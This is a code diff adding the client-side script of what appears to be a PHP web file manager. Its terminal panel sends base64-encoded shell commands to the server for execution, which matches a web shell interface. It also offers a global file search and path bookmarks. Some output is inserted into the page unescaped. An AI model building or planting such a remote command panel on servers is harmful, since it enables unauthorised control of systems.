+            let currentCwd = "<?php echo base64_encode($dir); ?>";
+            let promptStr = "<?php echo $term_prompt; ?>";
+            
+            tInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    const cmd = this.value; this.value = '';
+                    if (cmd.trim() === '') return;
+                    if (cmd.trim() === 'clear') { tOutput.innerHTML = ''; return; }
+
+                    const b64_cmd = btoa(unescape(encodeURIComponent(cmd)));
+                    const fd = new FormData();
+                    fd.append('ajax_action', 'terminal');
+                    fd.append('b64_cmd', b64_cmd);
+                    fd.append('b64_cwd', currentCwd);
+                    
+                    tOutput.innerHTML += `\n<span style="color:#0ff;">${promptStr}</span> <span style="color:#fff;">${cmd}</span>\n<span style="color:#888;">Executing...</span>`;
+                    tOutput.scrollTop = tOutput.scrollHeight;
+
+                    fetch('', { method: 'POST', body: fd })
+                    .then(r => r.text())
+                    .then(data => {
+                        tOutput.innerHTML = tOutput.innerHTML.replace('<span style="color:#888;">Executing...</span>', data);
+                        tOutput.scrollTop = tOutput.scrollHeight;
+                    })
+                    .catch(err => { 
+                        tOutput.innerHTML = tOutput.innerHTML.replace('<span style="color:#888;">Executing...</span>', '<span style="color:red">Error executing command.</span>'); 
+                    });
+                }
+            });
+        }
+        
+        function openSearch() {
+            document.getElementById('searchModal').style.display = 'flex';
+            setTimeout(() => document.getElementById('search_query').focus(), 100);
+        }
+        
+        document.getElementById('btnRunSearch').addEventListener('click', function(){
+            const q = document.getElementById('search_query').value;
+            const t = document.getElementById('search_type').value;
+            if(!q) return;
+            
+            const resBox = document.getElementById('search_res_box');
+            resBox.style.display = 'block';
+            resBox.innerHTML = '<div style="padding:15px; color:var(--cp-text);"><i class="fas fa-spinner fa-spin"></i> Searching globally... please wait...</div>';
+            
+            const fd = new FormData();
+            fd.append('ajax_action', 'global_search');
+            fd.append('q', q);
+            fd.append('type', t);
+            fd.append('dir', "<?php echo base64_encode($dir); ?>");
+            
+            fetch('', { method: 'POST', body: fd })
+            .then(r => r.text())
+            .then(data => { resBox.innerHTML = data; })
+            .catch(e => { resBox.innerHTML = '<div style="color:red; padding:15px;">Search failed.</div>'; });
+        });
+        
+        document.getElementById('search_query').addEventListener('keypress', function(e){
+            if(e.key === 'Enter') document.getElementById('btnRunSearch').click();
+        });
+        
+        function openBookmarks() {
+            renderBookmarks();
+            document.getElementById('bookmarkModal').style.display = 'flex';
+        }
+        
+        function addBookmark(pathRaw, pathB64) {
+            let bms = JSON.parse(localStorage.getItem('fm_bookmarks') || '[]');
+            if(bms.some(b => b.b64 === pathB64)) { alert("Path already bookmarked."); return; }
+            let name = pathRaw.split('/').pop() || pathRaw;
+            bms.push({ path: pathRaw, name: name, b64: pathB64 });
+            localStorage.setItem('fm_bookmarks', JSON.stringify(bms));
+            renderBookmarks();
+            renderSidebarBookmarks();
+        }
+        
+        function removeBookmark(index) {
+            let bms = JSON.parse(localStorage.getItem('fm_bookmarks') || '[]');
+            bms.splice(index, 1);
+            localStorage.setItem('fm_bookmarks', JSON.stringify(bms));
+            renderBookmarks();
+            renderSidebarBookmarks();
+        }
+        
+        function renderBookmarks() {
+            let bms = JSON.parse(localStorage.getItem('fm_bookmarks') || '[]');
+            let html = '';
+            if(bms.length === 0) {
+                html = '<div style="padding:15px; text-align:center; color:#888;">No bookmarks saved yet.</div>';
+            } else {
+                bms.forEach((b, i) => {
+                    html += `
+                    <div class="bookmark-item">
+                        <a href="?p=files&dir=${encodeURIComponent(b.b64)}"><i class="fas fa-folder" style="color:#ffca28; margin-right:8px;"></i> ${b.path}</a>
+                        <button onclick="removeBookmark(${i})" title="Remove"><i class="fas fa-trash"></i></button>
+                    </div>`;
+                });
+            }
+            document.getElementById('bookmarkListArea').innerHTML = html;
+        }
+
+        function renderSidebarBookmarks() {
+            let bms = JSON.parse(localStorage.getItem('fm_bookmarks') || '[]');
+            let sbArea = document.getElementById('sidebarBookmarksArea');
+            if(!sbArea) return;
+            
+            if(bms.length === 0) {
+                sbArea.innerHTML = '<div style="font-size:12px; color:#888; text-align:center; padding:10px 0;">No bookmarks saved.</div>';
+                return;
+            }
+            
+            let html = '';
+            bms.forEach(b => {
+                let shortName = b.name.length > 20 ? b.name.substring(0,20) + '...' : b.name;
+                html += `<a href="?p=files&dir=${encodeURIComponent(b.b64)}" class="sb-item" title="${b.path}"><i class="fas fa-folder"></i> ${shortName}</a>`;
+            });
+            sbArea.innerHTML = html;
+        }
+
+    </script>
+</body>
+</html>
